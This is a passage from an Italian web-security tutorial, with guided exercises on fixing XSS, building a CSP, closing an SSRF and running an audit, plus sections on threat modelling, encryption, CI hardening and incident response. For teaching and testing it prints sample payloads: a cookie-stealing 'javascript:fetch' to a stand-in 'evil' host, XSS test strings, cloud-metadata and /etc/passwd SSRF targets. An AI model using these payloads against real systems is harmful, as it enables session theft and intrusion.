//   { "nome": "Mario", "ruolo": "admin", "creditoResiduo": 999999 }

// ✅ Uno schema che elenca ciò che è modificabile: tutto il resto
//    viene SCARTATO, non è un errore ma non arriva al database
const SchemaAggiornamentoProfilo = z
  .object({
    nome: z.string().trim().min(1).max(100),
    bio: z.string().trim().max(500).optional(),
  })
  .strict() // ⚠ .strict() RIFIUTA i campi non previsti invece di
            //   ignorarli: meglio, perché segnala l'errore al client
```

```
LE ALTRE FORME DI ESPOSIZIONE, MENO OVVIE
  · i messaggi di errore con lo stack, il nome dell'host o la query
    SQL. In produzione: messaggio generico e identificativo della
    richiesta (tutorial_11 §A5).
  · le risposte 404 contro 403 che confermano l'esistenza di una
    risorsa altrui.
  · i tempi di risposta diversi fra "utente inesistente" e "password
    errata" (tutorial_13 §C1).
  · i commenti HTML e i file di sorgente (`.map`) pubblicati in
    produzione.
  · gli endpoint di diagnostica (`/debug`, `/metrics`, `/actuator`)
    raggiungibili da internet.
  · i backup e i `.git` serviti dal server web: `curl
    https://sito.it/.git/config` è la prima cosa che prova uno scanner.
```

---

## B9. Difesa in profondità: progettare per il fallimento

> **Analogia:** una nave con paratie stagne. Nessuno costruisce lo scafo pensando che si bucherà; lo si compartimenta perché *quando* si buca, l'acqua non arrivi dappertutto. La sicurezza funziona allo stesso modo: la domanda utile non è "questa difesa reggerà?", ma "cosa succede quando cade?".

```
LO STESSO ATTACCO, FERMATO A CINQUE LIVELLI DIVERSI

  XSS
   1. il framework fa l'escaping per default
   2. la CSP con nonce impedisce l'esecuzione dello script iniettato
   3. Trusted Types blocca la sink nel DOM
   4. il cookie è HttpOnly: lo script non ruba la sessione
   5. l'access token vive in memoria e dura dieci minuti

  ACCESSO NON AUTORIZZATO AI DATI
   1. autenticazione
   2. autorizzazione per ruolo
   3. controllo di proprietà nella query
   4. Row-Level Security nel database
   5. cifratura dei campi sensibili con una chiave che
      l'applicazione non possiede

Ogni livello è imperfetto. Cinque livelli imperfetti e INDIPENDENTI
sono difficili da attraversare tutti insieme — e la parola chiave è
indipendenti: cinque controlli che dipendono tutti dalla stessa
libreria sono un livello solo.
```

```
LE DUE DOMANDE CHE COMPLETANO IL RAGIONAMENTO

  "ME NE ACCORGEREI?"  una difesa che cade in silenzio è peggio di
  una che non c'è, perché produce fiducia. Servono: log degli accessi
  negati, allarme sui picchi di 401 e 403, report CSP monitorati,
  allarme sui tentativi di IDOR.

  "QUANTO DANNO FA?"  è la domanda che decide dove investire. Un
  attaccante che ottiene la chiave API di sola lettura di un servizio
  di terzi è un problema; uno che ottiene le credenziali del database
  di produzione è un altro ordine di grandezza. Il principio del
  PRIVILEGIO MINIMO — ogni componente ha i permessi che gli servono e
  non uno di più — è ciò che tiene la seconda risposta bassa.
```

---

# Parte C — Esercizi Pratici Guidati

---

## C1. Esercizi progressivi con soluzione

### Esercizio 1 — Trovare gli XSS in una pagina

**Obiettivo:** individuare tutte le vulnerabilità XSS in questo componente e correggerle.

```javascript
// IL CODICE DA CORREGGERE — pagina dei commenti
function mostraCommenti(commenti) {
  const contenitore = document.querySelector('#commenti')

  contenitore.innerHTML = commenti
    .map(
      (c) => `
    <article class="commento">
      <a href="${c.sitoAutore}">${c.autore}</a>
      <p>${c.testo}</p>
      <img src="${c.avatar}" onerror="this.src='/default.png'">
      <button onclick="rispondi('${c.id}')">Rispondi</button>
    </article>`,
    )
    .join('')
}

const parametri = new URLSearchParams(location.search)
document.querySelector('#titolo').innerHTML = `Commenti su "${parametri.get('post')}"`
```

```
# SOLUZIONE — sei vulnerabilità

1. c.autore e c.testo in innerHTML  → XSS PERSISTENTE, il più grave:
   colpisce chiunque apra la pagina. `<img src=x onerror=…>` basta.
2. c.sitoAutore in href  → `javascript:fetch('//evil/'+document.cookie)`
   si esegue al clic.
3. c.avatar in src  → oltre all'iniezione di attributi, permette di
   tracciare gli utenti verso un server esterno.
4. c.id dentro onclick  → uscendo dagli apici si inietta JavaScript:
   `1'); codiceMalevolo(); //`
5. parametri.get('post') in innerHTML  → XSS RIFLESSO basato sul DOM:
   il server non è nemmeno coinvolto.
6. `onerror` inline  → richiede 'unsafe-inline' nella CSP, e quindi
   annulla la difesa principale per tutta la pagina.
```

```javascript
// LA SOLUZIONE — nessuna stringa HTML costruita a mano
function urlSicuro(grezzo) {
  try {
    const url = new URL(grezzo, location.origin)
    return ['http:', 'https:'].includes(url.protocol) ? url.href : null
  } catch {
    return null
  }
}

function creaCommento(c) {
  const articolo = document.createElement('article')
  articolo.className = 'commento'

  const collegamento = document.createElement('a')
  // textContent: il testo resta testo, qualunque cosa contenga
  collegamento.textContent = c.autore
  const sito = urlSicuro(c.sitoAutore)
  if (sito) {
    collegamento.href = sito
    // noopener: la pagina aperta non può manipolare la tua via
    // window.opener; noreferrer non le dice da dove arriva
    collegamento.rel = 'noopener noreferrer nofollow'
  }

  const testo = document.createElement('p')
  testo.textContent = c.testo

  const avatar = document.createElement('img')
  avatar.src = urlSicuro(c.avatar) ?? '/default.png'
  avatar.alt = ''
  // Il gestore si aggancia con addEventListener, non con un attributo
  avatar.addEventListener('error', () => {
    avatar.src = '/default.png'
  })

  const pulsante = document.createElement('button')
  pulsante.textContent = 'Rispondi'
  // Il dato viaggia in un dataset, non dentro una stringa di codice
  pulsante.dataset['idCommento'] = String(c.id)

  articolo.append(collegamento, testo, avatar, pulsante)
  return articolo
}

function mostraCommenti(commenti) {
  const contenitore = document.querySelector('#commenti')
  contenitore.replaceChildren(...commenti.map(creaCommento))

  // Un solo gestore per tutti i pulsanti (delega)
  contenitore.addEventListener('click', (evento) => {
    const pulsante = evento.target.closest('button[data-id-commento]')
    if (pulsante) rispondi(pulsante.dataset['idCommento'])
  })
}

const parametri = new URLSearchParams(location.search)
document.querySelector('#titolo').textContent = `Commenti su "${parametri.get('post') ?? ''}"`
```

```
# LA VERIFICA
#   Inserisci come nome autore:  <img src=x onerror=alert(1)>
#   Come sito:                   javascript:alert(document.cookie)
#   Nell'URL:                    ?post=<svg onload=alert(1)>
#   → devono comparire come TESTO, e la console non deve mostrare
#     nessuna esecuzione né violazione CSP causata dal tuo codice.
```

---

### Esercizio 2 — Costruire una CSP per un'applicazione reale

**Obiettivo:** partire da un'applicazione senza CSP e arrivare a una policy in enforcement, senza rompere nulla.

```
# LA SITUAZIONE DI PARTENZA (tipica)
#   · un frontend React servito da Express
#   · Google Analytics
#   · font da Google Fonts
#   · immagini da un bucket S3
#   · un widget di chat di terze parti
#   · qualche <script> inline generato dal template
```

```typescript
// PASSO 1 — report-only, permissiva: NON blocca nulla, raccoglie
import { randomBytes } from 'node:crypto'
import type { RequestHandler } from 'express'

export const cspOsservazione: RequestHandler = (_richiesta, risposta, prossimo) => {
  const nonce = randomBytes(16).toString('base64')
  risposta.locals['nonce'] = nonce

  risposta.setHeader(
    'Content-Security-Policy-Report-Only',
    [
      `default-src 'self'`,
      `script-src 'nonce-${nonce}' 'strict-dynamic' https: 'unsafe-inline'`,
      `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com`,
      `font-src 'self' https://fonts.gstatic.com`,
      `img-src 'self' data: https://cdn.esempio.it https://www.google-analytics.com`,
      `connect-src 'self' https://www.google-analytics.com wss://chat.fornitore.example`,
      `frame-src https://chat.fornitore.example`,
      `object-src 'none'`,
      `base-uri 'none'`,
      `report-uri /api/csp-report`,
    ].join('; '),
  )

  prossimo()
}
```

```
# PASSO 2 — leggere i report per due settimane, e classificarli
#
#   violated-directive        occorrenze   causa
#   script-src (inline)            8.412   ← i NOSTRI script inline
#   script-src chrome-extension  142.331   ← estensioni: RUMORE
#   img-src data:                   ...    ← già permesso
#   connect-src https://tracker…    3.201   ← uno strumento che
#                                            nessuno ricorda di aver
#                                            aggiunto
#
# ⚠ Le estensioni del browser generano la maggior parte dei report e
#   non sono violazioni tue: vanno filtrate per schema
#   (chrome-extension:, moz-extension:, safari-extension:), altrimenti
#   il segnale è invisibile nel rumore.
```

```typescript
// PASSO 3 — correggere i propri script inline: dal template al nonce
// Prima:  <script>window.__STATO__ = {…}</script>
// Dopo:
// <script nonce="<%= nonce %>">window.__STATO__ = <%- statoJson %></script>
//
// ⚠ Lo stato serializzato va codificato per il contesto <script>:
//    una stringa che contiene "</script>" chiude il tag. La forma
//    sicura è JSON.stringify con l'escaping di < > &
export function statoSicuro(stato: unknown): string {
  return JSON.stringify(stato)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
}
```

```
# PASSO 4 — enforcement, e la policy finale
#   Content-Security-Policy: default-src 'self';
#     script-src 'nonce-…' 'strict-dynamic' https: 'unsafe-inline';
#     style-src 'self' 'nonce-…' https://fonts.googleapis.com;
#     font-src 'self' https://fonts.gstatic.com;
#     img-src 'self' data: https://cdn.esempio.it;
#     connect-src 'self' https://www.google-analytics.com
#                 wss://chat.fornitore.example;
#     frame-src https://chat.fornitore.example;
#     object-src 'none'; base-uri 'none'; form-action 'self';
#     frame-ancestors 'none'; upgrade-insecure-requests;
#     report-uri /api/csp-report
#
# E SI TIENE UN REPORT-ONLY PIÙ STRETTO ACCANTO: i due header
# coesistono, e quello in report-only prepara il passo successivo
# (per esempio togliere 'unsafe-inline' dagli stili).
#
# LA VERIFICA
#   · csp-evaluator.withgoogle.com sulla policy finale
#   · un <script> iniettato a mano nel DOM non deve eseguire
#   · il tasso di report deve CROLLARE dopo l'enforcement: se resta
#     alto, stai bloccando qualcosa di legittimo
```

---

### Esercizio 3 — Chiudere una SSRF

**Obiettivo:** una funzione di "anteprima del link" permette di raggiungere la rete interna. Correggerla in modo che la difesa non dipenda dal DNS.

```typescript
// IL CODICE DA CORREGGERE
export async function anteprima(url: string) {
  const risposta = await fetch(url)
  const html = await risposta.text()
  return { titolo: estraiTitolo(html), html } // ⚠ restituisce anche il corpo
}
```

```
# LA DIAGNOSI — cinque problemi
# 1. nessun controllo sullo schema: file:// legge il filesystem
# 2. nessun controllo sull'indirizzo: localhost e 169.254.169.254
#    (metadati del cloud, cioè le credenziali) sono raggiungibili
# 3. nessun timeout e nessun limite di dimensione: un URL che
#    risponde lentamente e all'infinito blocca il processo
# 4. i redirect vengono seguiti: il primo salto passa il controllo,
#    il secondo va dove vuole l'attaccante
# 5. il corpo torna al client: la SSRF diventa anche una lettura
```

```typescript
// LA SOLUZIONE
import { lookup } from 'node:dns/promises'

const LIMITE_BYTE = 512 * 1024

export async function anteprima(grezzo: string) {
  const url = new URL(grezzo)
  if (!['http:', 'https:'].includes(url.protocol)) throw new Error('schema non ammesso')

  const { address } = await lookup(url.hostname)
  if (indirizzoPrivato(address)) throw new Error('destinazione non consentita')

  const controller = new AbortController()
  const scadenza = setTimeout(() => controller.abort(), 5000)

  try {
    const risposta = await fetch(url, {
      // I redirect NON si seguono: ogni salto sarebbe una nuova
      // destinazione da rivalidare, ed è più semplice rifiutarli
      redirect: 'manual',
      signal: controller.signal,
      headers: { 'User-Agent': 'AnteprimaEsempio/1.0' },
    })

    if (risposta.status >= 300 && risposta.status < 400) {
      throw new Error('redirect non consentiti')
    }

    // Il Content-Length si controlla PRIMA di leggere; il limite in
    // lettura serve perché il Content-Length può mancare o mentire
    const dichiarata = Number(risposta.headers.get('content-length') ?? 0)
    if (dichiarata > LIMITE_BYTE) throw new Error('risposta troppo grande')

    const html = await leggiConLimite(risposta, LIMITE_BYTE)

    // Si restituisce SOLO ciò che serve: il corpo resta sul server
    return { titolo: estraiTitolo(html).slice(0, 200) }
  } finally {
    clearTimeout(scadenza)
  }
}

async function leggiConLimite(risposta: Response, massimo: number): Promise<string> {
  const lettore = risposta.body?.getReader()
  if (!lettore) return ''

  const pezzi: Uint8Array[] = []
  let totale = 0

  for (;;) {
    const { done, value } = await lettore.read()
    if (done) break
    totale += value.byteLength
    if (totale > massimo) {
      await lettore.cancel()
      throw new Error('risposta troppo grande')
    }
    pezzi.push(value)
  }

  return new TextDecoder().decode(Buffer.concat(pezzi))
}
```

```
# ⚠ LA DIFESA CHE MANCA ANCORA, E CHE IL CODICE NON PUÒ DARE
#   Fra `lookup` e `fetch` il record DNS può cambiare (DNS rebinding).
#   Le due chiusure vere:
#    · connettersi all'IP verificato con il nome nell'header Host
#      (richiede un agent personalizzato)
#    · far uscire questo traffico da un PROXY in una rete che non
#      raggiunge i servizi interni — è l'unica difesa indipendente
#      dal codice, e quella da preferire.
#
# LA VERIFICA
#   http://localhost:6379 · http://169.254.169.254/latest/meta-data/
#   file:///etc/passwd · un URL che redirige a 127.0.0.1
#   un URL che risponde 1 byte al secondo per sempre
#   → tutti devono fallire, e in fretta
```

---

## C2. Mini-progetto: audit di sicurezza con contromisure

L'esercizio chiave del modulo: un audit su un'applicazione esistente, con le contromisure implementate e verificate.

```
LA PROCEDURA, IN SEI FASI

1. RICOGNIZIONE  elenca ciò che esiste: endpoint (dall'OpenAPI o dal
   router), form, caricamenti, integrazioni esterne, dipendenze,
   dove stanno i segreti, chi ha accesso a cosa.

2. RICERCA AUTOMATICA  è il passo che costa meno e trova di più:
     pnpm audit --audit-level high        dipendenze note
     pnpm dlx gitleaks detect             segreti nella cronologia
     pnpm dlx retire                      librerie frontend obsolete
     securityheaders.com                  header mancanti
     csp-evaluator.withgoogle.com         qualità della CSP
     ZAP baseline scan                    scansione passiva

3. REVISIONE MANUALE  la parte che gli strumenti non fanno.
   Cerca nel repository, in quest'ordine:
     dangerouslySetInnerHTML · v-html · {@html · innerHTML
     $queryRaw · queryRawUnsafe · concatenazioni con `${` in SQL
     exec( · execSync( · spawn( con shell: true
     fetch( o axios( con un URL che viene dalla richiesta
     findUnique / findFirst senza un filtro sul proprietario
     process.env usato nel codice del frontend

4. TEST MIRATI  per ogni endpoint: chiamalo senza autenticazione;
   chiamalo con l'utente B su una risorsa di A; manda un corpo con
   campi in più (mass assignment); manda un id di tipo diverso.

5. CLASSIFICAZIONE  ogni risultato con impatto e sfruttabilità.
   Si corregge in quest'ordine: sfruttabile da remoto senza
   autenticazione → sfruttabile da un utente qualsiasi → richiede
   privilegi → richiede condizioni improbabili.

6. CORREZIONE E VERIFICA  ogni correzione ha un TEST che fallisce
   prima e passa dopo. Senza, la regressione torna al terzo rilascio.
```

```typescript
// L'ordine dei middleware, che è metà del risultato
export function creaApp(): Express {
  const app = express()
  app.set('trust proxy', 1)
  app.disable('x-powered-by')

  applicaHeaderSicurezza(app)     // 1. header, prima di tutto
  app.use(cspConNonce)            // 2. CSP con nonce per risposta
  app.use(isolamentoRisorse)      // 3. Fetch Metadata
  app.use(corsConfigurato)        // 4. CORS con lista chiusa
  app.use(limiteFrequenza(100, 60))
  app.use(express.json({ limit: '100kb' }))  // 5. limite sul corpo
  app.use(protezioneCsrf)
  app.use(autenticazioneOpzionale)

  app.use('/api', rotteApi)       // 6. le rotte, protette per default
  app.use(gestore404)
  app.use(gestoreProblemi)        // 7. errori: mai dettagli interni
  return app
}
```

```
# LA VERIFICA FINALE — la lista che decide se l'audit è chiuso
# 1. XSS: i payload di prova compaiono come testo in ogni campo
# 2. CSP: in enforcement, e csp-evaluator non segnala 'unsafe-inline'
#    né una lista di domini aggirabile
# 3. INJECTION: nessuna concatenazione in SQL, nessun exec con shell
# 4. AUTORIZZAZIONE: il test IDOR passa su OGNI risorsa
# 5. ESPOSIZIONE: nessuna risposta contiene passwordHash o simili;
#    un 500 forzato non mostra stack né host
# 6. SEGRETI: gitleaks pulito sull'intera cronologia; nessun
#    process.env nel bundle del frontend (cercalo nel file compilato)
# 7. HEADER: securityheaders.com almeno A
# 8. DIPENDENZE: pnpm audit senza high o critical
# 9. FILE: un .php o .html caricato non viene eseguito, ed è servito
#    da un'altra origine
# 10. LOG: gli accessi negati sono registrati, e un picco genera un
#     allarme che qualcuno riceve davvero
```

---

# Parte D — Approfondimento per Esperti

---

## D1. Un modello di minaccia proporzionato

```
Un modello di minaccia non è un documento di quaranta pagine: sono
quattro domande, e in un'ora si risponde.

  1. COSA PROTEGGO?  elenca gli asset in ordine di valore: dati
     personali, credenziali, documenti contabili, disponibilità del
     servizio, reputazione.
  2. DA CHI?  ed è la domanda che quasi tutti saltano:
       · uno script automatico che scansiona internet — colpisce
         tutti, sempre, ed è il 99% del traffico ostile
       · un utente legittimo che prova a fare di più (IDOR,
         manipolazione dei prezzi)
       · un ex dipendente con credenziali ancora valide
       · un attaccante mirato con tempo e risorse — raro, e non è il
         tuo problema principale finché non lo è
  3. COME?  per ogni asset, come ci si arriva. Il percorso più corto
     è quasi sempre: credenziali rubate, dipendenza vulnerabile,
     endpoint dimenticato.
  4. QUANTO COSTA LA DIFESA rispetto al danno? MFA obbligatoria per
     gli amministratori costa un'ora e chiude il vettore più comune;
     un HSM per cifrare i log costa mesi e chiude un caso raro.

⚠ IN UN PROGETTO PICCOLO le minacce reali sono la PERDITA DEL DATO e
  l'ERRORE DELL'UTENTE, non l'attaccante remoto sofisticato. Un
  backup verificato vale più di una CSP perfetta — e va detto quando
  qualcuno chiede "è sicuro?".
```

---

## D2. Cifratura a riposo e gestione delle chiavi

```
TRE LIVELLI, TRE MINACCE DIVERSE
  DISCO CIFRATO  protegge dal furto fisico del supporto. Non protegge
    da niente altro: il processo che legge il database vede tutto.
  COLONNA CIFRATA  protegge un dump del database e chi ha accesso in
    lettura al database ma non all'applicazione. ⚠ Rende impossibili
    ricerca e ordinamento su quel campo.
  CIFRATURA PRESSO IL CLIENT  protegge anche da te. È l'unica che
    regge se il server viene compromesso, ed è anche l'unica che
    rende impossibile il recupero se l'utente perde la chiave.
```

```typescript
// AES-256-GCM: cifra E autentica. Un modo senza autenticazione (CBC
// da solo) permette di modificare il testo cifrato senza accorgersene.
import { createCipheriv, createDecipheriv, randomBytes } from 'node:crypto'

export function cifra(testo: string, chiave: Buffer): string {
  // L'IV DEVE essere diverso a ogni cifratura: riusarlo con GCM
  // rompe completamente la sicurezza dello schema
  const iv = randomBytes(12)
  const cifratore = createCipheriv('aes-256-gcm', chiave, iv)
  const cifrato = Buffer.concat([cifratore.update(testo, 'utf8'), cifratore.final()])
  // iv + tag di autenticazione + testo cifrato, tutto insieme
  return Buffer.concat([iv, cifratore.getAuthTag(), cifrato]).toString('base64')
}

export function decifra(pacchetto: string, chiave: Buffer): string {
  const dati = Buffer.from(pacchetto, 'base64')
  const decifratore = createDecipheriv('aes-256-gcm', chiave, dati.subarray(0, 12))
  // Il tag va impostato PRIMA di final(): è lì che la verifica
  // fallisce se il testo cifrato è stato manomesso
  decifratore.setAuthTag(dati.subarray(12, 28))
  return Buffer.concat([decifratore.update(dati.subarray(28)), decifratore.final()]).toString('utf8')
}
```

```
LA PARTE DIFFICILE NON È CIFRARE: È GESTIRE LE CHIAVI
  · la chiave non sta accanto ai dati: un KMS, o almeno un gestore
    di segreti separato dal database
  · si ruota, e ruotare richiede di poter decifrare con la chiave
    VECCHIA mentre si cifra con la nuova → un identificativo di
    versione accanto a ogni valore cifrato
  · una chiave persa significa dati persi: il ripristino va provato
  · in produzione, la derivazione per uso (chiave di dati cifrata da
    una chiave master) evita di dover ricifrare tutto a ogni rotazione
```

---

## D3. Sicurezza della pipeline

```
LA CI È L'OBIETTIVO PIÙ REDDITIZIO CHE ESISTA: ha i segreti di
produzione, scrive negli artefatti che verranno eseguiti, e quasi
nessuno la sorveglia come sorveglia il server.

  · le AZIONI SI FISSANO AL COMMIT, non al tag:
      uses: actions/checkout@8ade135…   ✅
      uses: actions/checkout@v4          ❌ il tag si può spostare
  · PERMESSI MINIMI ed espliciti: `permissions: contents: read` come
    predefinito del workflow, e i permessi in più solo sul job che
    ne ha bisogno
  · ⚠ `pull_request_target` esegue codice del repository CON i
    segreti e nel contesto del repository base: una pull request da
    un fork può esfiltrarli. Si usa `pull_request`, che non ha i
    segreti.
  · nessun segreto nei log: mascherare non basta, non stamparli è
    l'unica garanzia
  · OIDC verso il cloud invece delle chiavi statiche: nessun segreto
    di lunga durata da rubare
  · l'approvazione umana per il deploy in produzione, e ambienti con
    revisori obbligatori
  · gli artefatti firmati e verificati prima del deploy (Sigstore)
```

---

## D4. Divulgazione responsabile

```
Prima o poi qualcuno trova qualcosa. Se non sa come dirtelo, lo
pubblica — oppure lo vende.

  /.well-known/security.txt   (RFC 9116)
    Contact: mailto:security@esempio.it
    Expires: 2027-01-01T00:00:00.000Z
    Preferred-Languages: it, en
    Policy: https://esempio.it/sicurezza

  · una casella che qualcuno LEGGE davvero, e una risposta entro
    pochi giorni anche solo per dire "l'abbiamo ricevuta"
  · una politica chiara: cosa è in ambito, cosa non lo è, che test
    sono ammessi, e l'impegno a non agire legalmente contro chi
    segnala in buona fede
  · un tempo dichiarato per la correzione e per la pubblicazione
  · il riconoscimento a chi segnala: costa nulla, e cambia
    completamente il tono di ogni segnalazione successiva

⚠ La reazione peggiore è la minaccia legale: trasforma un alleato in
  un avversario, e la vulnerabilità resta comunque.
```

---

## D5. Quando succede: la risposta all'incidente

```
LE SEI FASI, IN ORDINE, E LA PRIMA È QUELLA CHE SI SBAGLIA

1. PREPARARSi  prima. Chi si chiama, chi decide, come si comunica se
   il sistema principale è compromesso, dove sono i backup, chi può
   ruotare le credenziali. Scritto, e provato.
2. RILEVARE  log centralizzati, allarmi su 401/403 anomali, sui
   report CSP, sugli accessi da luoghi nuovi.
3. CONTENERE  ⚠ NON spegnere subito la macchina: si perde la memoria
   e con essa le prove. Si isola dalla rete, si preserva lo stato, si
   revocano le credenziali e le sessioni.
4. ERADICARE  chiudere la via d'ingresso, non solo ripulire i
   sintomi. Se non sai COME è entrato, non l'hai chiuso.
5. RIPRISTINARE  da uno stato di cui ti fidi, con le credenziali
   nuove, e sorvegliato: chi è entrato una volta riprova.
6. IMPARARE  un post-mortem senza colpe: le persone non causano gli
   incidenti, i sistemi che permettono l'errore sì.

GLI OBBLIGHI DI LEGGE ESISTONO E HANNO SCADENZE  in Europa, una
violazione di dati personali si notifica all'autorità entro 72 ore
dalla scoperta, e agli interessati se il rischio per loro è elevato.
⚠ Le condizioni esatte, i termini e chi sia l'autorità competente
  vanno verificati sul testo vigente e con chi ha competenza legale
  PRIMA che serva: durante un incidente non c'è tempo per leggere il
  GDPR.
```

---

# Parte E — Riepilogo, Checklist e Prossimi Passi

---

## Riepilogo concettuale

```
SICUREZZA WEB — Mappa dei concetti

IL MODELLO DEL BROWSER
├── origine = schema + host + porta
├── si può MANDARE una richiesta cross-origin, non LEGGERE la risposta
├── uno script di terzi gira con i privilegi della TUA pagina
└── CORS allenta la same-origin policy: non è una difesa del server

XSS
├── riflesso · persistente (il peggiore) · basato sul DOM
├── sink: innerHTML, outerHTML, document.write, eval, href, on*
├── difesa: textContent, setAttribute con nome noto, URL validato
│     per schema, sanificazione con libreria mantenuta
├── mai regex: il parser HTML è tollerante per progetto
└── le vie d'uscita dei framework sono il primo posto dove cercare

INJECTION
├── SQL: query parametrizzate; i parametri proteggono i VALORI,
│     non la STRUTTURA (colonne e ordinamenti → mappa a chiavi note)
├── comandi: execFile con array, mai una riga di shell
├── NoSQL: validare il TIPO prima della query
└── la regola: input CODIFICATO PER LA DESTINAZIONE

TRASPORTO E HEADER
├── HTTPS obbligatorio · HSTS (⚠ preload è quasi irreversibile)
├── nosniff · Referrer-Policy · Permissions-Policy · COOP/CORP
└── X-XSS-Protection è deprecato: va rimosso

CSP
├── 'unsafe-inline' annulla la protezione; una lista di domini si aggira
├── nonce per risposta + 'strict-dynamic'
├── object-src 'none' · base-uri 'none' · frame-ancestors 'none'
├── adozione: report-only → correggere → enforcement
└── Trusted Types chiude l'XSS nel DOM, che la CSP non copre

ALTRE SUPERFICI
├── Fetch Metadata: Sec-Fetch-Site blocca una classe intera
├── file: tipo dai BYTE, nome GENERATO, servito da un'altra origine
├── SSRF: schema, indirizzo, timeout, dimensione, niente redirect —
│     e un proxy che non raggiunge la rete interna
├── supply chain: postinstall disattivato, lockfile, audit, SBOM, SRI
├── segreti: mai nel codice, nel bundle, nei log, nelle immagini
└── esposizione: select esplicito, schema .strict(), 404 invece di 403

DIFESA IN PROFONDITÀ
├── ogni difesa cade: la domanda è cosa succede dopo
├── i livelli devono essere INDIPENDENTI
├── "me ne accorgerei?" — una difesa che cade in silenzio è peggio
└── privilegio minimo: è ciò che tiene basso il danno
```

---

## Checklist di competenze

**Parte A — Basi**

- [ ] Sai definire un'origine e cosa la same-origin policy permette e vieta
- [ ] Sai perché uno script di terzi non è "in una sandbox"
- [ ] Distingui XSS riflesso, persistente e basato sul DOM
- [ ] Conosci le sink pericolose e le API sicure che le sostituiscono
- [ ] Sai perché sanificare con una regex non funziona
- [ ] Sai qual è la via d'uscita del tuo framework e la cerchi nel repository
- [ ] Scrivi query parametrizzate e sai cosa i parametri NON proteggono
- [ ] Usi `execFile` con un array invece di `exec` con una stringa
- [ ] Sai che CORS non protegge il server e non ferma il CSRF
- [ ] Sai perché riflettere l'origine ricevuta annulla la protezione
- [ ] Conosci gli header di sicurezza principali e cosa fa ciascuno

**Parte B — Comprensione**

- [ ] Sai perché `'unsafe-inline'` annulla una CSP
- [ ] Costruisci una CSP con nonce e `strict-dynamic`
- [ ] Sai perché `'unsafe-inline'` accanto a un nonce è corretto
- [ ] Conosci il percorso report-only → enforcement e perché non si salta
- [ ] Sai cosa aggiunge Trusted Types rispetto alla CSP
- [ ] Sai usare `Sec-Fetch-Site` e a quali rotte applicarlo
- [ ] Determini il tipo di un file dai byte e generi il nome
- [ ] Sai perché i file caricati vanno serviti da un'altra origine
- [ ] Riconosci una SSRF e conosci il limite delle difese nel codice
- [ ] Sai perché `postinstall` è il vettore principale della supply chain
- [ ] Sai perché un segreto committato va ruotato e non solo rimosso
- [ ] Sai cos'è il mass assignment e come lo chiude uno schema `.strict()`
- [ ] Sai ragionare per livelli indipendenti e chiederti "me ne accorgerei?"

**Parte C — Pratica**

- [ ] Hai trovato tutte e sei le vulnerabilità del componente commenti
- [ ] Hai riscritto il componente senza costruire HTML a mano
- [ ] Hai portato una CSP da report-only a enforcement filtrando il rumore
- [ ] Hai chiuso la SSRF su schema, indirizzo, timeout, dimensione e redirect
- [ ] Hai eseguito l'audit in sei fasi e scritto un test per ogni correzione

**Parte D — Esperto**

- [ ] Sai costruire un modello di minaccia con quattro domande
- [ ] Sai quali minacce contano davvero in un progetto piccolo
- [ ] Conosci i tre livelli di cifratura a riposo e cosa protegge ciascuno
- [ ] Sai perché l'IV non si riusa mai con GCM
- [ ] Sai perché le azioni della CI si fissano al commit
- [ ] Sai perché `pull_request_target` è pericoloso
- [ ] Pubblichi un `security.txt` con una casella che qualcuno legge
- [ ] Conosci le sei fasi della risposta a un incidente, e perché non si spegne subito

---

## Anti-pattern da evitare

| Anti-pattern | Problema | Soluzione |
|---|---|---|
| `innerHTML` con dato utente | XSS diretto | `textContent`, o sanificazione con libreria mantenuta |
| URL utente in `href` senza controllo | `javascript:` esegue codice al clic | Validare lo schema con `new URL` |
| `'unsafe-inline'` nella CSP | La policy non protegge da nulla | Nonce per risposta + `strict-dynamic` |
| Concatenare stringhe in SQL | SQL injection | Query parametrizzate; mappa per le colonne |
| `exec` con una stringa costruita | Command injection: la più distruttiva | `execFile` con un array di argomenti |
| Riflettere `Origin` in CORS, o `*` con credenziali | Equivale ad ammettere qualunque sito | Lista chiusa + `credentials: true` |
| Fidarsi del `Content-Type` o del nome file ricevuti | Il client li sceglie: traversal e file eseguibili | Tipo dai byte iniziali, nome generato |
| File caricati serviti dalla tua origine | Se eseguiti, hanno i privilegi della tua pagina | Origine separata, `nosniff`, `attachment` |
| `fetch` di un URL fornito dall'utente | SSRF verso Redis, metadati cloud, rete interna | Schema, IP, timeout, dimensione, niente redirect, proxy isolato |
| `postinstall` abilitato | Vettore principale della supply chain | `enable-pre-post-scripts=false` |
| Script da CDN senza `integrity` | Se la CDN cambia il file, esegui il suo codice | Subresource Integrity, o auto-ospitare |
| Segreti nel codice o nel bundle | Repository, cronologia git e browser sono pubblici | Variabili d'ambiente validate; gestore di segreti |
| Restituire l'oggetto intero | `passwordHash` e simili finiscono nella risposta | `select` esplicito nel livello dati |
| `data: richiesta.body` | Mass assignment: si scrive `ruolo: "admin"` | Schema Zod `.strict()` |
| Stack trace in produzione | Espone host, query, struttura interna | Messaggio generico + identificativo richiesta |

---

## Troubleshooting rapido

**La CSP blocca risorse legittime dopo l'enforcement**
- Causa: la fase report-only è stata saltata o è durata poco
- Fix: tornare a report-only, raccogliere due settimane, filtrare le estensioni dal rumore

**Gli script inline non funzionano con la CSP a nonce**
- Causa: il nonce non è nel tag, oppure è riusato fra risposte
- Fix: generarlo per ogni risposta e inserirlo nel template

**`Refused to connect` dopo aver aggiunto la CSP**
- Causa: manca il dominio in `connect-src` — e le WebSocket richiedono lo schema `wss:`
- Fix: aggiungere l'origine esatta, schema compreso

**Il preflight CORS fallisce, o il cookie non arriva in cross-origin**
- Causa: header o metodo non elencati, OPTIONS bloccata dall'autenticazione, oppure manca uno fra `SameSite=None; Secure`, `credentials: 'include'` e `credentials: true`
- Fix: CORS prima dell'autenticazione; elencare gli header personalizzati; per i cookie servono tutti e tre insieme

**HSTS rende il sito irraggiungibile**
- Causa: certificato scaduto, o `includeSubDomains` su un sottodominio ancora in HTTP
- Fix: rinnovare; `max-age` breve durante l'adozione. ⚠ Con `preload` l'uscita richiede mesi

**Il caricamento accetta file che dovrebbe rifiutare**
- Causa: si controlla l'estensione o il `Content-Type` dichiarato
- Fix: `file-type` sui byte iniziali, e lista chiusa di MIME

**`pnpm audit` segnala una vulnerabilità in una dipendenza transitiva senza correzione**
- Causa: il pacchetto a monte non ha ancora aggiornato
- Fix: `overrides` per forzare la versione corretta; valutare se il codice vulnerabile è raggiungibile

**Il frontend espone una chiave API**
- Causa: variabile con prefisso pubblico usata per un segreto
